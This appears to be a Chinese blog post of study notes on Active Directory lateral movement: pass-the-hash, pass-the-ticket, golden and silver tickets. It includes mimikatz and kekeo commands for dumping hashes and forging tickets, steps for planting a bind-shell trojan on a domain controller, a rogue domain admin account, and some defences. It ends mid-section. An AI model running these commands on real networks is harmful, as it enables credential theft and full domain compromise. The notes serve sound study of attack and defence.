<p>哈希传递（Pass The Hash, PTH）顾名思义，就是利用哈希去登录内网中的其他机器，而不是通过明文密码登录的方式。通过哈希传递，攻击者不需要花时间破解哈希值得到明文，在Windows Server 2012 R2及之后版本的操作系统中，默认不会在内存中保存明文密码，Mimikatz 就读不到密码明文，因此此时往往会使用工具将哈希值传递到其他计算机中进行登录验证（哈希值就是用来证明身份的，有正确的用户名和密码哈希值就能通过验证）</p>
<h3 id="使用NTLM-Hash进行哈希传递">使用NTLM Hash进行哈希传递</h3>
<pre class="line-numbers language-none"><code class="language-none">#在目标主机上使用 mimikatz 获取 NTLM Hash
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

#在其他远程计算机中，以管理员权限打开 mimikatz
mimikatz.exe
privilege::debug
sekurlsa::pth &#x2F;user:administrator &#x2F;domain:teamssix.com &#x2F;ntlm:161cff084477fe596a5db81874498a24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>mimikatz 执行后，会弹出一个拥有对应 Hash 用户权限的 CMD 窗口。<img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115192216534.png" alt="image-20231115192216534"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115194131606.png" alt="image-20231115194131606"></p>
<p>在展示一个完整的流程，如下</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115232414776.png" alt="image-20231115232414776"><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115232447606.png" alt="image-20231115232447606"><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115232505014.png" alt="image-20231115232505014"><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115232542409.png" alt="image-20231115232542409"><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115232600432.png" alt="image-20231115232600432"><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115232839139.png" alt="image-20231115232839139"></p>
<pre class="line-numbers language-none"><code class="language-none">#我们还能将msf木马copy到域控上并设置计划任务或创建服务来执行，如下
#将msf木马bindshell.exe复制到目标机器上
copy bindshell.exe \\OWA\c$

#在域控上创建shell计划任务
schtasks &#x2F;create &#x2F;tn &quot;shell&quot; &#x2F;tr C:\bindshell.exe &#x2F;sc MINUTE &#x2F;s 192.168.52.138
#在域控上立即启动该计划任务
schtasks &#x2F;run &#x2F;s 192.168.52.138 &#x2F;i &#x2F;tn &quot;shell&quot;

#在域控上创建服务启动木马
sc \\OWA create bindshell binpath&#x3D;&quot;c:\bindshell.exe&quot;
#在域控上立即启动该服务
sc \\OWA start bindshell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115233607062.png" alt="image-20231115233607062"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115233628682.png" alt="image-20231115233628682"></p>
<h3 id="使用AES-256-密钥进行哈希传递">使用AES-256 密钥进行哈希传递</h3>
<pre class="line-numbers language-none"><code class="language-none">#使用 mimikatz 抓取密钥
mimikatz.exe
privilege::debug
sekurlsa::ekeys
#在其他远程计算机中，以管理员权限打开 mimikatz
mimikatz.exe
privilege::debug
sekurlsa::pth &#x2F;user:administrator &#x2F;domain:teamssix.com &#x2F;aes256:7358fb65149672d99b8c9f3dfd0dfeb486b78268e9c5250b23aefbd26f293c60<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里需要目标机器上安装 KB2871997 补丁，安装后才可以导入AES-256密钥的方式进行横向移动（这种方式又称为Pass The Key)</p>
<p>补丁下载地址：<a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/download/details.aspx?id=42722">https://www.microsoft.com/en-us/download/details.aspx?id=42722</a></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231115193557946.png" alt="image-20231115193557946"></p>
<p>除了AES-256密钥，AES-128密钥也可以用来进行哈希传递，不过平时基本都是使用 NTLM 哈希进行传递。</p>
<p>注意事项：</p>
<ul>
<li>dir 后跟要使用的主机名，而不是IP地址，否则会提示用户名或密码错误。</li>
<li>使用AES密钥对远程主机进行哈希传递的前提是在本地安装了KB2871997补丁</li>
<li>如果要使用mimikaz的哈希传递功能，需要具有本地管理员权限。这是由mimikatz的实现机制决定的(需要高权限进程lsass.exe的执行权限)</li>
</ul>
<p>这里说一下更新KB2871997补丁产生的影响：</p>
<p>微软在2014年5月发布了KB2871997补丁。该补丁禁止通过本地管理员权限与远程计算机进行连接，其后果就是：无法通过本地管理员对远程计算机使用PsExec、WMI、smbexec、schtasks，也无法访问远程主机的文件共享等。在实际测试中，<mark>更新KB2871997补丁后，Administrator账号(SID为500)例外——使用该账户的散列值依旧可以进行哈希传递。这里强调的是SID为500的账号。在一些计算机中，即使将Administator改名，也不会影响SID的值。所以，如果攻击者使用SID为500的账号进行横向移动，就不会受到K827197的影响</mark>。</p>
<h2 id="票据传递">票据传递</h2>
<p>要想使用mimikatz的哈希传递功能，必须具有本地管理员权限。mimikatz也提供了不需要本地管理员权限进行横向渗透测试的方法，其中最典型的就是票据传递( Pass The Ticket, PTT)，它是基于Kerberos认证的一种攻击方式</p>
<h3 id="使用mimikatz导出票据和传递">使用mimikatz导出票据和传递</h3>
<p>使用 mimikatz 可以将内存中的票据进行导出</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe
privilege::debug
sekurlsa::tickets &#x2F;export
#mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::tickets &#x2F;export&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>执行该命令后，会在当前目录下生成多个服务的票据文件，例如 kirbi 等</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231116203618049.png" alt="image-20231116203618049"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231116203023319.png" alt="image-20231116203023319"></p>
<p>使用以下命令可以清除内存中的票据</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe
kerberos::purge
#mimikatz &quot;kerberos::purge&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231116203706972.png" alt="image-20231116203706972"></p>
<p>将票据文件注入内存，<mark>把高权限的票据文件注入内存后，就会获得相应的权限</mark></p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe
kerberos::ptt &quot;[0;4beae]-2-0-40e00000-Administrator@krbtgt-TEAMSSIX.COM.kirbi&quot;

#将高权限的票据文件注入内存后，即可列出远程计算机系统的文件目录
dir \\dc\c$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231116205221638.png" alt="image-20231116205221638"></p>
<h3 id="使用kekeo导出票据和传递">使用kekeo导出票据和传递</h3>
<p>kekeo 需要使用域名、用户名、NTLM HASH 生成票据，然后再将票据导入，从而连接远程计算机</p>
<pre class="line-numbers language-none"><code class="language-none">#在当前目录生成一个票据文件
#kekeo &quot;tgt::ask &#x2F;user:用户名 &#x2F;domain:域名 &#x2F;ntlm:NTLM哈希&quot;
kekeo &quot;tgt::ask &#x2F;user:administrator &#x2F;domain:testlab.com &#x2F;ntlm:f478e94103927311912ff00846210a30&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231116205702022.png" alt="image-20231116205702022"></p>
<p>使用 kekeo 清除当前内存中的其他票据，不然可能会导致票据传递失败</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::purge
#在 Windows 命令行中也可以执行系统自带的命令进行内存中的票据清除
klist purge<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>使用以下命令将票据导入内存即可获得相应的权限。</p>
<pre class="line-numbers language-none"><code class="language-none">kekeo.exe
kerberos::ptt &quot;TGT_administrator@TEAMSSIX.COM_krbtgt~teamssix.com@TEAMSSIX.COM.kirbi&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>之后键入 exit 退出 kekeo，使用 dir 命令就可以列出远程文件了</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231116210030671.png" alt="image-20231116210030671"></p>
<p>注意点：</p>
<ul>
<li>票据文件注入内存的默认有效时间为 10 小时</li>
<li>在目标机器上不需要本地管理员权限就可以进行票据传递</li>
<li>使用票据传递时，dir 命令必须使用主机名，如果使用 IP 地址会提示拒绝访问</li>
</ul>
<h3 id="黄金票据">黄金票据</h3>
<p>黄金票据（Golden Ticket，又称金票）就是伪造krbtgt用户的TGT票据（即票据授予票据，也被称为认证票据），krbtgt用户是域控中用来管理发放票据的用户，拥有了该用户的权限，就可以伪造系统中的任意用户。</p>
<p>因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了金票就有了域内的最高权限。</p>
<p>每个用户的Ticket都是由krbtgt的密码Hash来生成的，那么，我们如果拿到了krbtgt的密码Hash，其实就可以伪造任意用户的Ticket。对于攻击者来说，实际上只要拿到了域控权限，就可以直接导出krbtgt的密码Hash，再通过mimikatz即可生成任意用户任何权限的Ticket。</p>
<h4 id="金票伪造原理">金票伪造原理</h4>
<p>在Kerberos认证中，Client通过AS(身份认证服务)认证后，AS会给Client一个<br>
Logon Session Key和TGT，而Logon Session Key并不会保存在KDC中，krbtgt的NTLM Hash又是固定的，所以只要得到krbtgt的NTLM Hash，就可以伪造TGT和Logon Session Key来进入下一步Client与TGS的交互。所以有了金票后，就可以跳过AS验证，不用验证账户和密码，所以也不担心域管密码修改。</p>
<p>这里结合Kerberos认证流程再走一下金票伪造原理，黄金票据主要是发生在kerberos认证的第③和第④步上。</p>
<p>在Kerberos认证流程的第②步中，AS会给返回两个数据，所以在进入第③步时，客户端会持有这两个数据，即一个是TGT凭证、一个是自己账号ntlm_hash加密的session_key。可以看一下第②步中AS返回给客户端的数据包，如下：</p>
<pre class="line-numbers language-none"><code class="language-none">#第二步中AS返回给客户端的数据
[Client_ntlm_hash(K(c,tgs))],[Krbtgt_ntlm_hash(k(c,tgs),Client_name(DomainName\Username),TGT_EndTime)]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>通过对数据包的分析，可以很直观地发现，这个TGT凭证是Krbtgt_ntlm_hash加密的信息。所以当我们知道kertgt的ntlm_hash时，就可以伪造TGT凭证，发送给票据生成服务器（TGS），这样，我们就可以访问域内任意一台服务器，这就是黄金票据。这里可以再看一下第③步中客户端向TGS发起的请求数据包，同样是含有Krbtgt_ntlm_hash加密的信息，所以kertgt的ntlm_hash是伪造金票的关键</p>
<pre class="line-numbers language-none"><code class="language-none">[Session_key(Authenticator（[DomainName\Username,ServerName(DomainName\Server)]）)],[TGT（Krbtgt_ntlm_hash(k(c,tgs),Client_name(DomainName\Username),TGT_EndTime)）]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="黄金票据特点">黄金票据特点</h4>
<ul>
<li>域控制器中的KDC服务不验证TGT中的用户帐户，直到TGT超过20分钟，这意味着攻击者可以使用禁用和删除的帐户，甚至是在Active Directory中不存在的虚拟帐户。</li>
<li>由于在域控制器上由KDC服务生成的域设置了Kerberos策略，如果提供票据，则系统信任票据的有效性。这意味着，即使域策略声明Kerberos登录票据（TGT）只有10小时有效，如果票据声明有效期为10 年，那么也会信任票据的有效性期为10年。</li>
<li>该KRBTGT帐户密码从不更改和直到KRBTGT密码被更改（两次），攻击者可以创建黄金票据。请注意，即使伪造用户更改其密码，创建用于模拟用户的Golden Ticket仍然存在。</li>
<li>它绕过了SmartCard身份验证要求，因为它绕过了DC在创建TGT之前执行的常规验证。</li>
<li>这个精心创建的TGT要求攻击者拥有Active Directory域的KRBTGT密码哈希值（通常从域控制器转储）。</li>
<li>KRBTGT NTLM哈希可用于生成一个有效的TGT（使用RC4）模拟任何用户访问Active Directory中的任何资源。</li>
<li>在主机上都可以生成和使用黄金票据（TGT），即使没有加入域也是如此。只要网络可以访问域。</li>
<li>用于从AD森林中的DC获取有效的TGS票据，并提供一个坚持在一切域访问所有的主机的好办法。</li>
</ul>
<h4 id="金票利用条件">金票利用条件</h4>
<p>利用大前提：</p>
<ul>
<li>拿到域控的权限</li>
</ul>
<p>在利用黄金票据（Golden Ticket）进行 PTP 票据传递时，需要先知道以下信息：</p>
<ul>
<li>伪造的域管理员用户名【其实可以伪造任意用户(即使是不存在的用户)，只是说伪造域管用户更有价值】</li>
<li>完整的域名</li>
<li>域 SID</li>
<li>krbtgt 的 NTLM Hash 或 AES-256 值</li>
</ul>
<p>获取域的SID和krbtgt账号的NTLM HASH的前提是需要已经拿到了域控的权限，所以<mark>拿到域控的权限是金票利用的大前提</mark></p>
<p>krbtgt 用户是域自带的用户，被 KDC 密钥分发中心服务所使用，属于 Domain Admins 组。</p>
<h4 id="金票的利用">金票的利用</h4>
<h5 id="导出-krbtgt-的-NTLM-Hash">导出 krbtgt 的 NTLM Hash</h5>
<p>在 mimikatz 下执行以下命令</p>
<pre class="line-numbers language-none"><code class="language-none">lsadump::dcsync &#x2F;domain:teamssix.com &#x2F;user:krbtgt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>执行这条命令后，会得到类似如下的回显</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231121111500618.png" alt="image-20231121111500618"></p>
<p>假设这里得到 krbtgt 的 NTLM Hash 为 d685b9c4fa2d318a9943ed68948af087，下面的演示也会使用这个NTLM Hash</p>
<p>该命令使用的 dcsync 功能远程转储 AD 里的 ntds.dit，使用 /user 参数，可以只导出指定用户的值。</p>
<p>也可以使用获取 krbtgt 的 NTLM Hash</p>
<pre class="line-numbers language-none"><code class="language-none">sekurlsa::krbtgt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231121114536131.png" alt="image-20231121114536131"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231121114629067.png" alt="image-20231121114629067"></p>
<p>再或者使用以下命令获取 krbtgt 的 NTLM Hash 、域 SID 值，<mark>但该命令无法获取 AES-256 的值</mark></p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe
privilege::debug
lsadump::lsa &#x2F;patch &#x2F;user:krbtgt
#或者直接获取所有用户的NTLM Hash
#mimikatz &quot;lsadump::lsa &#x2F;patch&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231121112115283.png" alt="image-20231121112115283"></p>
<h5 id="获取基本信息">获取基本信息</h5>
<pre class="line-numbers language-none"><code class="language-none">#获取域 SID
wmic useraccount get name,sid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231121104831735.png" alt="image-20231121104831735"></p>
<p><mark>这里得到 administrator 的 SID 为 S-1-5-21-284927032-1122706408-2778656994-500，即表示当前域的 SID 就是 S-1-5-21-284927032-1122706408-2778656994</mark></p>
<pre class="line-numbers language-none"><code class="language-none">#获取当前用户的 SID
whoami &#x2F;user
#查询域管理员账号
net group &quot;domain admins&quot; &#x2F;domain
#查询域名
ipconfig &#x2F;all<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>除了上面方法还可以使用Mimikatz获取需要的基本信息，如下</p>
<pre class="line-numbers language-none"><code class="language-none">#获取域名称
net view &#x2F;domain
#查询域管理员账号
net group &quot;domain admins&quot; &#x2F;domain
#Mimikatz获取krbtgt的HTLM-Hash及域SID
mimikatz &quot;lsadump::dcsync &#x2F;domain:test666.com &#x2F;user:krbtgt&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231121130733831.png" alt="image-20231121130733831"></p>
<h5 id="制作黄金票据并注入内存">制作黄金票据并注入内存</h5>
<p>先将票据清空</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>生成票据</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::golden &#x2F;admin:Administrator &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;krbtgt:d685b9c4fa2d318a9943ed68948af087 &#x2F;ticket:Administrator.kiribi

#对上面命令用到的参数做一个解释
&#x2F;admin：伪造的用户名
&#x2F;domain：域名称
&#x2F;sid：SID值
&#x2F;krbtgt：krbtgt的HASH值
&#x2F;ticket：生成的票据名称<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231121111757724.png" alt="image-20231121111757724"></p>
<p>传递票据并注入内存</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::ptt Administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231121112507053.png" alt="image-20231121112507053"></p>
<h5 id="验证权限">验证权限</h5>
<p>退出 mimikatz ，使用 dir 发现可以成功列出域控文件</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231121105453316.png" alt="image-20231121105453316"></p>
<p>尝试创建一个的域管账号，命令执行成功</p>
<pre class="line-numbers language-none"><code class="language-none">net user aaa !@#qwe123 &#x2F;add &#x2F;domain
net group &quot;domain admins&quot; aaa &#x2F;add&#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231121125447024.png" alt="image-20231121125447024"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231121125528471.png" alt="image-20231121125528471"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231121125539149.png" alt="image-20231121125539149"></p>
<p>这里使用 PsExec 也同样是能获取到权限的，除了上面使用 NTLM Hash 之外，还可以使用 krbtgt 的 AES-256 值生成黄金票据</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos::golden &#x2F;admin:Administrator &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;aes256:3dfa1f9b5809250a7670c12d1e109f0acb9660f902da8aa3a4be55a16affbbd5 &#x2F;ticket:Administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>命令完成之后，也会生成一个 Administrator.kiribi 文件，之后的操作就都一样了。</p>
<p>此外，还有一些注意事项：</p>
<ul>
<li>这种方式导入的Ticket默认在20分钟以内生效，如果过期了，再次ptt导入Golden Ticket即可</li>
<li>可以伪造任意用户，即使其不存在</li>
<li>krbtgt的NTLM hash不会轻易改变，即使修改域控管理员密码</li>
</ul>
<h5 id="MSF-下的利用">MSF 下的利用</h5>
<p>首先上线一个普通用户，然后加载 kiwi 模块</p>
<pre class="line-numbers language-none"><code class="language-none">load kiwi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>生成黄金票据</p>
<pre class="line-numbers language-none"><code class="language-none">golden_ticket_create -d teamssix.com -k d685b9c4fa2d318a9943ed68948af087 -s S-1-5-21-284927032-1122706408-2778656994 -u administrator -t &#x2F;root&#x2F;administrator.ticket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>将黄金票据注入内存</p>
<pre class="line-numbers language-none"><code class="language-none">kerberos_ticket_use &#x2F;root&#x2F;administrator.ticket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>注入成功后，进入 Shell 就能查看 dc 里的文件了</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231121110214957.png" alt="image-20231121110214957"></p>
<h4 id="黄金票据的防御">黄金票据的防御</h4>
<ul>
<li>限制域管理员登录到除域控制器和少数管理服务器以外的任何其他计算机（不要让其他管理员登录到这些服务器）将所有其他权限委派给自定义管理员组。这大大降低了攻击者访问域控制器的Active Directory的ntds.dit。如果攻击者无法访问AD数据库（ntds.dit文件），则无法获取到KRBTGT帐户密码。</li>
<li>禁用KRBTGT帐户，并保存当前的密码以及以前的密码。KRBTGT密码哈希用于在Kerberos票据上签署PAC并对TGT（身份验证票据）进行加密。如果使用不同的密钥（密码）对证书进行签名和加密，则DC（KDC）通过检查KRBTGT以前的密码来验证。</li>
<li>建议定期更改KRBTGT密码（毕竟这是一个管理员帐户）。更改一次，然后让AD备份，并在12到24小时后再次更改它。这个过程应该对系统环境没有影响。这个过程应该是确保KRBTGT密码每年至少更改一次的标准方法。</li>
<li>一旦攻击者获得了KRBTGT帐号密码哈希的访问权限，就可以随意创建黄金票据。通过快速更改KRBTGT密码两次，使任何现有的黄金票据（以及所有活动的Kerberos票据）失效。这将使所有Kerberos票据无效，并消除攻击者使用其KRBTGT创建有效金票的能力。</li>
</ul>
<h3 id="白银票据">白银票据</h3>
<p>白银票据（Silver Tickets，又称银票）不与密钥分发中心 KDC 交互，<mark>通过伪造的票据授予服务 TGS 生成伪造的服务票据 ST 直接与服务器 Server 进行交互</mark>。因为在TGT已经在PAC里限定了给Client授权的服务（通过SID的值），所以银票只能访问指定服务（即是针对于某个机器上的某个服务生成的白银票据，所以只能访问指定的机器中指定的服务）。</p>
<p>这里对“只能访问指定服务”做一个说明，方便理解。比如，为“CIFS”服务创建白银票据并注入内存后，就能够获得目标计算机上任何Windows共享的管理权限，就可以访问目标计算机上的任何共享（比如c＄共享），那么对共享服务的一些操作也能做（比如我们能够将文件拷贝到共享文件中）。但是除了共享服务以外的其他服务我们还是没有权限。</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231121143812667.png" alt="image-20231121143812667"></p>
<p>白银票据与黄金票据的区别：</p>
<ol>
<li>
<p>白银票据不经过 KDC，因此<mark>白银票据日志相对于黄金票据会更少</mark>，同时白银票据的日志都在目标服务器上，域控上不会有日志</p>
</li>
<li>
<p><mark>白银票据利用服务账户的哈希值</mark>，不同于黄金票据利用 krbtgt 账户的哈希值，因此白银票据更加隐蔽，但白银票据的权限就远不如黄金票据的权限了</p>
</li>
<li>
<p>除了上面说到的两点外，银票和金票还有以下区别</p>
</li>
</ol>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231121142639932.png" alt="image-20231121142639932"></p>
<h4 id="银票伪造原理">银票伪造原理</h4>
<p>白银票据主要是发生在Kerberos认证的第⑤步上。在第⑤步中客户端要向服务器端发送请求，如下</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231121151027961.png" alt="image-20231121151027961"></p>
<p>第⑤步中客户端要向服务器端发送的请求数据包如下：</p>
<pre class="line-numbers language-none"><code class="language-none">K(c,s)加密[Authenticator（[DomainName\Username,ServerName(DomainName\Server)]）],[Tiket（Server_ntlm_hash(Tiket（K(c,s),Client_Name(domainName\Username),TGT_EndTime）)）]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>通过对这个数据包的分析，可以发现只要我们有了server_ntlm_hash，我们就可以伪造票据，这个也就是白银票据</p>
<h4 id="白银票据特点">白银票据特点</h4>
<ul>
<li>白银票据是一个有效的票据授予服务（TGS）Kerberos票据，因为Kerberos验证服务运行的每台服务器都对服务主体名称的服务帐户进行加密和签名。</li>
<li>黄金票据是伪造TGT并且有效的获得任何Kerberos服务，而白银票据是伪造TGS。这意味着白银票据仅限于特定服务器上的任何服务。</li>
<li>大多数服务不验证PAC（通过将PAC校验和发送到域控制器进行PAC验证），因此使用服务帐户密码哈希生成的有效TGS可以完全伪造PAC</li>
<li>攻击者需要服务帐户密码哈希值</li>
<li>TGS是伪造的，所以没有和TGT通信，意味着DC从验证过。</li>
<li>任何事件日志都在目标服务器上。</li>
</ul>
<h4 id="银票利用条件">银票利用条件</h4>
<p>利用大前提：</p>
<ul>
<li>拿到目标机器权限(目标机器即可，不一定是域控。拿到权限是为了获取服务账户的hash)</li>
</ul>
<p>想利用白银票据需要先知道以下信息：</p>
<ul>
<li>域名</li>
<li>域 SID</li>
<li>目标服务器的 FQDN ，即完整的域名</li>
<li>可利用的服务</li>
<li>服务账户的 NTML HASH</li>
<li>伪造的用户名(可以是任意用户名，也包括不存在的用户)</li>
</ul>
<p>这里说明一点，对于“服务账户的 NTML HASH”有很多种叫法，如“目标主机的NTML哈希”“服务的NTML散列”“目标Server的NTLM Hash”“主机名对应用户的NTLM Hash”等，都是同一个意思，这里统一称为“服务账户的 NTML HASH”，并<mark>提供一个判断标准：用户名为“主机名$”这个用户的NTLM Hash</mark>。还有几点常识也做一个统一，如下：</p>
<ul>
<li>散列(值) == 哈希(值) == HASH(Hash)</li>
<li>账号 == 账户 ==  用户</li>
<li>服务 == Server</li>
</ul>
<h4 id="银票的利用">银票的利用</h4>
<p>白银票据伪造的服务类型可以从以下内容中来进行选择，还是强调一点，银票只能针对指定服务来进行伪造</p>
<pre class="line-numbers language-none"><code class="language-none">#下面这是白银票据的服务列表，即具体什么服务需要伪造什么票据(想要实现左边的服务类型，就要伪造右边对应的服务银票)
#显而易见，一个 Service 不一定只有一个 Service Silver Ticket
#举个例子，如果我想使用WMI服务，就需要创建两张Silver Tickets，分别是目标机器的HOST Ticket和RPCSS Ticket

服务类型(Service Type)      	服务银票(Service Silver Tickets)
WMI                            HOST、RPCSS
PowerShell Remoting        	   HOST、HTTP，根据操作系统版本的不同，可能还需要：WSMAN、RPCSS
WinRM                          HOST、HTTP
Scheduled Tasks                HOST
Windows File Share             CIFS
LDAP(如Mimikatz DCSync操作)     LDAP
Windows Remote Server          RPCSS、LDAP、CIFS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="获取基本信息-2">获取基本信息</h5>
